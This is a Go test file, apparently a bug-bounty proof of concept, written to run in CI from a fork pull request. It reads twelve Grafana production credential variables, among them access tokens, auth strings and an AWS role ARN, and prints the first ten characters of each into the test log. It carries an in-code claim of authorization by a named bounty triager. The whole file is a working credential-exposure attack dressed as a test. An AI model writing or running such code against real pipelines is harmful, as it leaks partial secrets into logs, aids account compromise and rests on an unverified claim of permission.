package cloud_test

import (
    "testing"
    "os"
    "fmt"
)

func TestPoCCredentialAccess(t *testing.T) {
    t.Log("=== SECURITY PoC: Demonstrating credential access from fork PR ===")
    t.Log("=== Authorized by Intigriti triager @frostweaver ===")
    
    credentials := []string{
        "GRAFANA_AUTH",
        "GRAFANA_URL",
        "GRAFANA_ONCALL_ACCESS_TOKEN",
        "GRAFANA_SM_ACCESS_TOKEN",
        "GRAFANA_SM_URL",
        "GRAFANA_K6_ACCESS_TOKEN",
        "GRAFANA_CLOUD_PROVIDER_ACCESS_TOKEN",
        "GRAFANA_CLOUD_PROVIDER_AWS_ROLE_ARN",
        "GRAFANA_FLEET_MANAGEMENT_AUTH",
        "GRAFANA_FLEET_MANAGEMENT_URL",
        "GRAFANA_STACK_ID",
        "GRAFANA_CLOUD_PROVIDER_URL",
    }
    
    foundCount := 0
    for _, cred := range credentials {
        val := os.Getenv(cred)
        if val != "" {
            foundCount++
            // Show only first 10 chars to prove access without leaking full token
            preview := val
            if len(val) > 10 {
                preview = val[:10] + "..." + fmt.Sprintf("[%d chars total]", len(val))
            }
            t.Logf("✓ ACCESSIBLE: %s = %s", cred, preview)
        } else {
            t.Logf("✗ NOT SET: %s", cred)
        }
    }
    
    t.Logf("\n=== SUMMARY ===")
    t.Logf("Total credentials accessible from fork PR: %d", foundCount)
    
    if foundCount == 0 {
        t.Fatal("PoC failed: No credentials accessible (fork protection may be working)")
    } else {
        t.Logf("✓ PoC SUCCESSFUL: Fork PR can access production credentials")
    }
}
